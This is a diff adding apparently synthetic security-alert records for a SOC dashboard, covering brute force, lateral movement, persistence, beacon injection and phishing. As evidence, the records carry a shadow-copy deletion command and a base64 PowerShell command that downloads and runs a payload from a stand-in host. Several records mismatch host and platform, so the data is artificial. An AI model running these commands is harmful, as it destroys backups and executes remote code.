+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:35:46.258Z",
+    "updatedAt": "2026-05-31T14:35:46.258Z"
+  },
+  {
+    "_id": "jlhg84n",
+    "timestamp": "2026-05-31T14:36:01.259Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:36:01.260Z",
+    "updatedAt": "2026-05-31T14:36:01.260Z"
+  },
+  {
+    "_id": "yhjmg7i",
+    "timestamp": "2026-05-31T14:36:16.259Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:36:16.260Z",
+    "updatedAt": "2026-05-31T14:36:16.260Z"
+  },
+  {
+    "_id": "5tduynt",
+    "timestamp": "2026-05-31T14:36:31.261Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:36:31.263Z",
+    "updatedAt": "2026-05-31T14:36:31.263Z"
+  },
+  {
+    "_id": "vtg9xz8",
+    "timestamp": "2026-05-31T14:36:46.262Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:36:46.263Z",
+    "updatedAt": "2026-05-31T14:36:46.263Z"
+  },
+  {
+    "_id": "4agtibi",
+    "timestamp": "2026-05-31T14:37:01.264Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:37:01.265Z",
+    "updatedAt": "2026-05-31T14:37:01.265Z"
+  },
+  {
+    "_id": "173k6tg",
+    "timestamp": "2026-05-31T14:37:16.266Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:37:16.267Z",
+    "updatedAt": "2026-05-31T14:37:16.267Z"
+  },
+  {
+    "_id": "vh9p3ey",
+    "timestamp": "2026-05-31T14:37:31.266Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:37:31.267Z",
+    "updatedAt": "2026-05-31T14:37:31.267Z"
+  },
+  {
+    "_id": "62p5rrj",
+    "timestamp": "2026-05-31T14:37:46.267Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:37:46.268Z",
+    "updatedAt": "2026-05-31T14:37:46.268Z"
+  },
+  {
+    "_id": "9yojlfr",
+    "timestamp": "2026-05-31T14:38:01.268Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:38:01.269Z",
+    "updatedAt": "2026-05-31T14:38:01.269Z"
+  },
+  {
+    "_id": "t3r3faj",
+    "timestamp": "2026-05-31T14:38:16.268Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:38:16.269Z",
+    "updatedAt": "2026-05-31T14:38:16.269Z"
+  },
+  {
+    "_id": "zpd3l1d",
+    "timestamp": "2026-05-31T14:38:31.269Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:38:31.270Z",
+    "updatedAt": "2026-05-31T14:38:31.270Z"
+  },
+  {
+    "_id": "av9zf2r",
+    "timestamp": "2026-05-31T14:38:46.270Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:38:46.271Z",
+    "updatedAt": "2026-05-31T14:38:46.271Z"
+  },
+  {
+    "_id": "6j5za39",
+    "timestamp": "2026-05-31T14:39:01.271Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:39:01.271Z",
+    "updatedAt": "2026-05-31T14:39:01.271Z"
+  },
+  {
+    "_id": "jnfz6wr",
+    "timestamp": "2026-05-31T14:39:41.833Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:39:41.834Z",
+    "updatedAt": "2026-05-31T14:39:41.834Z"
+  },
+  {
+    "_id": "2bd6x4c",
+    "timestamp": "2026-05-31T14:39:56.833Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:39:56.834Z",
+    "updatedAt": "2026-05-31T14:39:56.834Z"
+  },
+  {
+    "_id": "o2x7cax",
+    "timestamp": "2026-05-31T14:40:11.833Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:40:11.834Z",
+    "updatedAt": "2026-05-31T14:40:11.834Z"
+  },
+  {
+    "_id": "ny4ucgf",
+    "timestamp": "2026-05-31T14:40:26.835Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:40:26.836Z",
+    "updatedAt": "2026-05-31T14:40:26.836Z"
+  },
+  {
+    "_id": "bvef78b",
+    "timestamp": "2026-05-31T14:40:41.835Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:40:41.836Z",
+    "updatedAt": "2026-05-31T14:40:41.836Z"
+  },
+  {
+    "_id": "2faauam",
+    "timestamp": "2026-05-31T14:40:56.837Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:40:56.838Z",
+    "updatedAt": "2026-05-31T14:40:56.838Z"
+  },
+  {
+    "_id": "a4g9nq8",
+    "timestamp": "2026-05-31T14:41:11.839Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:41:11.839Z",
+    "updatedAt": "2026-05-31T14:41:11.839Z"
+  },
+  {
+    "_id": "xge9voa",
+    "timestamp": "2026-05-31T14:41:26.840Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:41:26.840Z",
+    "updatedAt": "2026-05-31T14:41:26.840Z"
+  },
+  {
+    "_id": "us2wfzz",
+    "timestamp": "2026-05-31T14:41:41.842Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:41:41.843Z",
+    "updatedAt": "2026-05-31T14:41:41.843Z"
+  },
+  {
+    "_id": "in92lhv",
+    "timestamp": "2026-05-31T14:41:56.843Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:41:56.844Z",
+    "updatedAt": "2026-05-31T14:41:56.844Z"
+  },
+  {
+    "_id": "ewkdkpq",
+    "timestamp": "2026-05-31T14:49:45.294Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:49:45.296Z",
+    "updatedAt": "2026-05-31T14:49:45.296Z"
+  },
+  {
+    "_id": "jbqq9mj",
+    "timestamp": "2026-05-31T14:50:00.296Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:50:00.297Z",
+    "updatedAt": "2026-05-31T14:50:00.297Z"
+  },
+  {
+    "_id": "bdaodm9",
+    "timestamp": "2026-05-31T14:50:15.296Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:50:15.297Z",
+    "updatedAt": "2026-05-31T14:50:15.297Z"
+  },
+  {
+    "_id": "9kna6lm",
+    "timestamp": "2026-05-31T14:50:30.297Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:50:30.299Z",
+    "updatedAt": "2026-05-31T14:50:30.299Z"
+  },
+  {
+    "_id": "yiyvrn5",
+    "timestamp": "2026-05-31T14:50:45.297Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:50:45.299Z",
+    "updatedAt": "2026-05-31T14:50:45.299Z"
+  },
+  {
+    "_id": "quvzkli",
+    "timestamp": "2026-05-31T14:51:00.299Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:51:00.299Z",
+    "updatedAt": "2026-05-31T14:51:00.299Z"
+  },
+  {
+    "_id": "nuuippv",
+    "timestamp": "2026-05-31T14:51:15.300Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:51:15.303Z",
+    "updatedAt": "2026-05-31T14:51:15.303Z"
+  },
+  {
+    "_id": "08bacw4",
+    "timestamp": "2026-05-31T14:51:30.301Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:51:30.303Z",
+    "updatedAt": "2026-05-31T14:51:30.303Z"
+  },
+  {
+    "_id": "mfpp4hx",
+    "timestamp": "2026-05-31T14:51:45.301Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:51:45.302Z",
+    "updatedAt": "2026-05-31T14:51:45.302Z"
+  },
+  {
+    "_id": "hecn4n2",
+    "timestamp": "2026-05-31T14:52:00.301Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:52:00.302Z",
+    "updatedAt": "2026-05-31T14:52:00.302Z"
+  },
+  {
+    "_id": "j1hc3qo",
+    "timestamp": "2026-05-31T14:52:15.301Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:52:15.303Z",
+    "updatedAt": "2026-05-31T14:52:15.303Z"
+  },
+  {
+    "_id": "jbth6u8",
+    "timestamp": "2026-05-31T14:52:30.302Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:52:30.303Z",
+    "updatedAt": "2026-05-31T14:52:30.303Z"
+  },
+  {
+    "_id": "2ejyesx",
+    "timestamp": "2026-05-31T14:52:45.305Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:52:45.306Z",
+    "updatedAt": "2026-05-31T14:52:45.306Z"
+  },
+  {
+    "_id": "u6c0a5n",
+    "timestamp": "2026-05-31T14:53:00.306Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:53:00.307Z",
+    "updatedAt": "2026-05-31T14:53:00.307Z"
+  },
+  {
+    "_id": "03vylvn",
+    "timestamp": "2026-05-31T14:53:15.307Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:53:15.308Z",
+    "updatedAt": "2026-05-31T14:53:15.308Z"
   }
 ]
